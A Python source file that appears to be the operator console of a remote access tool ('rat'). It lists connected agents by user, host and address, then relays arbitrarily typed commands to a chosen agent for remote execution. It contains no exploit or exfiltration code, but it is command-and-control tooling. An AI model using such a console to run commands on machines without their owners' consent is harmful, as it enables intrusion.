from __future__ import annotations

import shlex
import time

from rat.server.app import ServerApp, Session


def _format_session(sess: Session) -> str:
    age = int(time.time() - sess.connected_at)
    info = sess.info.to_dict() if sess.info else {}
    who = f"{info.get('username', '?')}@{info.get('hostname', '?')}"
    return f"Agent {sess.session_id} | {who} | {sess.addr[0]}:{sess.addr[1]} | {age}s"


def run_cli(app: ServerApp) -> None:
    active_session_id: str | None = None

    while True:
        if active_session_id is None:
            prompt = "rat > "
        else:
            prompt = f"rat agent {active_session_id} > "

        try:
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            app.log.info("Exiting.")
            return

        if not line:
            continue

        parts = shlex.split(line)
        cmd = parts[0].lower()
        args = parts[1:]

        if active_session_id is None:
            # Server-level commands
            if cmd in {"exit", "quit"}:
                return

            if cmd == "help":
                print("Commands: sessions, interact <id>, disconnect <id>, exit")
                continue

            if cmd == "sessions":
                sessions = app.list_sessions()
                if not sessions:
                    print("No active sessions.")
                else:
                    for sess in sessions.values():
                        print(_format_session(sess))
                continue

            if cmd == "interact":
                if not args:
                    print("Usage: interact <id>")
                    continue
                if app.get_session(args[0]) is None:
                    print(f"Unknown session: {args[0]}")
                    continue
                active_session_id = args[0]
                print(f"Interacting with agent {active_session_id}. Type 'back' to return.")
                continue

            if cmd == "disconnect":
                if not args:
                    print("Usage: disconnect <id>")
                    continue
                app.remove_session(args[0])
                print(f"Disconnected session {args[0]}")
                continue

            print(f"Unknown command: {cmd} (try help)")

        else:
            # Agent-level commands
            if cmd in {"back", "exit", "quit"}:
                active_session_id = None
                continue

            sess = app.get_session(active_session_id)
            if sess is None:
                print("Session closed.")
                active_session_id = None
                continue

            try:
                result = sess.peer.request("run", {"line": line}, timeout=120.0)
                data = result.get("data", {})
                print(f"Result: {data}")
            except Exception as exc:
                print(f"Command failed: {exc}")